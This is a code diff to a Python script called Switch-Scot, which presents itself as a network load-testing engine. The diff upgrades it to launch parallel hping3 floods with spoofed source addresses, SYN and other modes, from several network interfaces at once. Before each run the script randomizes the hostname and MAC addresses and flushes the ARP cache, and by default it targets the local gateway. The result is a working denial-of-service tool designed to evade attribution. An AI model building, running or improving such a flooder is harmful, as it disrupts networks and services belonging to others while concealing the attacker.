@@ -3,7 +3,7 @@
 
 """
 Switch-Scot ⚡
-Universal Network Resilience & Load Testing Engine
+Universal Multi-Interface Network Resilience & Load Testing Engine
 Designed for Linux (Arch, Kali, Debian, Ubuntu) and Android (Termux)
 """
 
@@ -23,20 +23,31 @@ BANNER = r"""
  \__ \ V  V /| |  _/ __| ' \_____\__ \ _| '_ \
  |___/\_/\_/ |_|\__\___|_||_|    |___/__| .__/
                                          |_|   
- Universal Network Resilience Engine v2.5
+ Universal Multi-Interface Network Resilience Engine v3.0
 """
 
 class SwitchScot:
-    def __init__(self, target="10.0.0.1", port=80, interface=None, mode="tcp-syn", skip_mac=False):
+    def __init__(self, target="10.0.0.1", port=80, interfaces=None, mode="tcp-syn", skip_mac=False):
         self.target = target
         self.port = port
         self.mode = mode
         self.skip_mac = skip_mac
         self.is_termux = self.check_termux()
-        self.interface = interface or self.detect_interface()
-        self.attack_process = None
+        
+        # Format interfaces as list
+        if interfaces is None:
+            self.interfaces = [self.detect_default_interface()]
+        elif isinstance(interfaces, str):
+            self.interfaces = [i.strip() for i in interfaces.split(",") if i.strip()]
+        else:
+            self.interfaces = list(interfaces)
+            
+        if not self.interfaces:
+            self.interfaces = [self.detect_default_interface()]
+
+        self.attack_processes = []
         self.start_time = None
-        self.current_mac = "N/A"
+        self.current_macs = {}
         self.current_hostname = "N/A"
 
     @staticmethod
@@ -88,7 +99,7 @@ class SwitchScot:
             pass
         return "10.0.0.1"
 
-    def detect_interface(self):
+    def detect_default_interface(self):
         try:
             out = subprocess.check_output(["ip", "route", "show", "default"], stderr=subprocess.DEVNULL).decode()
             match = re.search(r"dev\s+([^\s]+)", out)
@@ -100,22 +111,22 @@ class SwitchScot:
         ifaces = self.get_available_interfaces()
         return ifaces[0] if ifaces else "wlan0"
 
-    def get_mac_address(self):
+    def get_mac_address(self, iface):
         try:
-            out = subprocess.check_output(["ip", "link", "show", self.interface], stderr=subprocess.DEVNULL).decode()
+            out = subprocess.check_output(["ip", "link", "show", iface], stderr=subprocess.DEVNULL).decode()
             match = re.search(r"link/ether\s+(([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2})", out)
             return match.group(1) if match else "Unknown"
         except Exception:
             return "Unknown"
 
-    def wait_for_carrier_and_route(self, timeout=15):
-        print(f"[*] Verifying carrier link and route readiness on '{self.interface}'...")
+    def wait_for_carrier_and_route(self, iface, timeout=15):
+        print(f"[*] Verifying carrier link and route readiness on '{iface}'...")
         start_time = time.time()
         
         while time.time() - start_time < timeout:
             carrier_ok = False
-            carrier_file = f"/sys/class/net/{self.interface}/carrier"
-            operstate_file = f"/sys/class/net/{self.interface}/operstate"
+            carrier_file = f"/sys/class/net/{iface}/carrier"
+            operstate_file = f"/sys/class/net/{iface}/operstate"
 
             if os.path.exists(carrier_file):
                 try:
@@ -138,14 +149,14 @@ class SwitchScot:
                 try:
                     res = subprocess.run(["ip", "route", "get", self.target], capture_output=True)
                     if res.returncode == 0:
-                        print(f"[+] Interface '{self.interface}' connected. Route to {self.target} verified.")
+                        print(f"[+] Interface '{iface}' connected. Route to {self.target} verified.")
                         return True
                 except Exception:
                     pass
 
             time.sleep(1)
 
-        print(f"[!] Notice: Link timeout reached. Proceeding with execution on '{self.interface}'.")
+        print(f"[!] Notice: Link timeout reached. Proceeding on '{iface}'.")
         return False
 
     def randomize_identity(self):
@@ -165,25 +176,24 @@ class SwitchScot:
         subprocess.run(["hostname", new_host], capture_output=True)
         self.current_hostname = new_host
 
-        # 3. Randomize MAC Address (if enabled)
-        if not self.skip_mac:
-            print(f"[*] Cycling MAC address on '{self.interface}'...")
-            subprocess.run(["ip", "link", "set", self.interface, "down"], capture_output=True)
-            subprocess.run(["macchanger", "-r", self.interface], capture_output=True)
-            subprocess.run(["ip", "link", "set", self.interface, "up"], capture_output=True)
-            self.current_mac = self.get_mac_address()
-            self.wait_for_carrier_and_route()
-        else:
-            self.current_mac = self.get_mac_address()
-            print(f"[*] Preserving existing MAC address on '{self.interface}' ({self.current_mac}).")
+        # 3. Randomize MAC Address for all selected interfaces
+        for iface in self.interfaces:
+            if not self.skip_mac:
+                print(f"[*] Cycling MAC address on '{iface}'...")
+                subprocess.run(["ip", "link", "set", iface, "down"], capture_output=True)
+                subprocess.run(["macchanger", "-r", iface], capture_output=True)
+                subprocess.run(["ip", "link", "set", iface, "up"], capture_output=True)
+                self.current_macs[iface] = self.get_mac_address(iface)
+                self.wait_for_carrier_and_route(iface)
+            else:
+                self.current_macs[iface] = self.get_mac_address(iface)
+                print(f"[*] Preserving existing MAC address on '{iface}' ({self.current_macs[iface]}).")
 
         # 4. Flush ARP neighbor cache
         subprocess.run(["ip", "neigh", "flush", "all"], capture_output=True)
 
-    def build_command(self):
-        base_cmd = ["hping3", "--flood", "--rand-source"]
-        if self.interface:
-            base_cmd += ["-I", self.interface]
+    def build_command_for_interface(self, iface):
+        base_cmd = ["hping3", "--flood", "--rand-source", "-I", iface]
         
         if self.mode == "tcp-syn":
             return base_cmd + ["-p", str(self.port), "-S", self.target]
@@ -201,28 +211,33 @@ class SwitchScot:
         self.check_dependencies()
         self.randomize_identity()
 
-        cmd = self.build_command()
         print("\n" + "=" * 65)
-        print(f" ⚡ SWITCH-SCOT ENGINE ACTIVE")
-        print(f" • Platform  : {'Android (Termux)' if self.is_termux else 'Linux OS'}")
-        print(f" • Interface : {self.interface} | MAC: {self.current_mac}")
-        print(f" • Hostname  : {self.current_hostname}")
-        print(f" • Mode      : {self.mode.upper()} | Target: {self.target}:{self.port if self.mode != 'icmp' else 'ICMP'}")
+        print(f" ⚡ SWITCH-SCOT MULTI-INTERFACE ENGINE ACTIVE")
+        print(f" • Platform   : {'Android (Termux)' if self.is_termux else 'Linux OS'}")
+        ifaces_info = [f"{i} ({self.current_macs.get(i, 'N/A')})" for i in self.interfaces]
+        print(f" • Interfaces : {', '.join(ifaces_info)}")
+        print(f" • Hostname   : {self.current_hostname}")
+        print(f" • Mode       : {self.mode.upper()} | Target: {self.target}:{self.port if self.mode != 'icmp' else 'ICMP'}")
         print("=" * 65)
         print(" [*] Press Ctrl+C to terminate execution.\n")
 
         self.start_time = datetime.now()
         try:
-            self.attack_process = subprocess.Popen(
-                cmd,
-                preexec_fn=os.setsid,
-                stdout=subprocess.DEVNULL,
-                stderr=subprocess.DEVNULL
-            )
+            # Launch one parallel process per selected interface
+            for iface in self.interfaces:
+                cmd = self.build_command_for_interface(iface)
+                proc = subprocess.Popen(
+                    cmd,
+                    preexec_fn=os.setsid,
+                    stdout=subprocess.DEVNULL,
+                    stderr=subprocess.DEVNULL
+                )
+                self.attack_processes.append(proc)
             
+            ifaces_str = ", ".join(self.interfaces)
             while True:
                 elapsed = str(datetime.now() - self.start_time).split(".")[0]
-                sys.stdout.write(f"\r >> [RUNNING] Target: {self.target} | Mode: {self.mode.upper()} | Elapsed: {elapsed} ")
+                sys.stdout.write(f"\r >> [RUNNING] Target: {self.target} | Active Cards: [{ifaces_str}] | Mode: {self.mode.upper()} | Elapsed: {elapsed} ")
                 sys.stdout.flush()
                 time.sleep(1)
 
@@ -230,12 +245,12 @@ class SwitchScot:
             self.stop()
 
     def stop(self):
-        if self.attack_process:
+        for proc in self.attack_processes:
             try:
-                os.killpg(os.getpgid(self.attack_process.pid), signal.SIGKILL)
+                os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
             except Exception:
                 pass
-        print("\n\n[+] Switch-Scot execution stopped.")
+        print("\n\n[+] Switch-Scot execution stopped on all interfaces.")
         sys.exit(0)
 
 def run_interactive_menu():
@@ -244,21 +259,39 @@ def run_interactive_menu():
     print(" 🛠️  INTERACTIVE EASY SETUP MENU")
     print("=" * 65)
 
-    # 1. Interface Selection
+    # 1. Multi-Interface Selection
     ifaces = SwitchScot.get_available_interfaces()
     default_iface = ifaces[0] if ifaces else "wlan0"
     
     print("\n[+] Detected Network Interfaces:")
     for idx, iface in enumerate(ifaces, start=1):
-        tag = " (Recommended / Default)" if idx == 1 else ""
+        tag = " (Default)" if idx == 1 else ""
         print(f"  [{idx}] {iface}{tag}")
+    print(f"  [A] ALL Interfaces Simultaneously (Multi-Card Turbo Mode 🚀)")
     
-    sel_iface = input(f"\n[?] Select Interface [1-{len(ifaces)}, default 1]: ").strip()
-    try:
-        chosen_iface = ifaces[int(sel_iface) - 1] if sel_iface else default_iface
-    except (ValueError, IndexError):
-        chosen_iface = default_iface
-    print(f" -> Selected: {chosen_iface}")
+    sel_iface = input(f"\n[?] Select Interface(s) [e.g. 1, 1,2, or A for all - default 1]: ").strip().lower()
+    
+    chosen_ifaces = []
+    if sel_iface in ["a", "all"]:
+        chosen_ifaces = ifaces
+    elif sel_iface:
+        # Split by comma or space
+        parts = re.split(r'[, ]+', sel_iface)
+        for p in parts:
+            try:
+                num = int(p)
+                if 1 <= num <= len(ifaces):
+                    chosen_ifaces.append(ifaces[num - 1])
+            except ValueError:
+                if p in ifaces:
+                    chosen_ifaces.append(p)
+        # Deduplicate preserving order
+        chosen_ifaces = list(dict.fromkeys(chosen_ifaces))
+    
+    if not chosen_ifaces:
+        chosen_ifaces = [default_iface]
+        
+    print(f" -> Selected: {', '.join(chosen_ifaces)}")
 
     # 2. Target IP Selection
     detected_gw = SwitchScot.detect_gateway()
@@ -302,25 +335,24 @@ def run_interactive_menu():
 
     # Launch Engine
     print("\n" + "-" * 65)
-    input("⚡ Press [ENTER] to launch Switch-Scot...")
+    input("⚡ Press [ENTER] to launch Switch-Scot on all selected interfaces...")
     
     engine = SwitchScot(
         target=chosen_target,
         port=chosen_port,
-        interface=chosen_iface,
+        interfaces=chosen_ifaces,
         mode=chosen_mode,
         skip_mac=skip_mac
     )
     engine.start()
 
 def main():
-    # If executed without CLI arguments, launch interactive menu!
     if len(sys.argv) == 1:
         run_interactive_menu()
         return
 
     parser = argparse.ArgumentParser(
-        description="Switch-Scot ⚡ Universal Cross-Platform Network Resilience & Load Testing Engine",
+        description="Switch-Scot ⚡ Universal Multi-Interface Network Resilience & Load Testing Engine",
         formatter_class=argparse.RawTextHelpFormatter
     )
     parser.add_argument(
@@ -335,9 +367,10 @@ def main():
         help="Target Port (Default: 80)"
     )
     parser.add_argument(
-        "-i", "--interface",
+        "-i", "--interfaces",
+        nargs="+",
         default=None,
-        help="Network interface to bind (Default: Auto-detected)"
+        help="Network interface(s) to bind (e.g. -i wlp4s0 wlp9s0f4u2 or 'all')"
     )
     parser.add_argument(
         "-m", "--mode",
@@ -356,10 +389,16 @@ def main():
     )
 
     args = parser.parse_args()
+    
+    # Handle 'all' in CLI
+    cli_ifaces = args.interfaces
+    if cli_ifaces and len(cli_ifaces) == 1 and cli_ifaces[0].lower() in ["all", "a"]:
+        cli_ifaces = SwitchScot.get_available_interfaces()
+
     engine = SwitchScot(
         target=args.target,
         port=args.port,
-        interface=args.interface,
+        interfaces=cli_ifaces,
         mode=args.mode,
         skip_mac=args.no_mac
     )
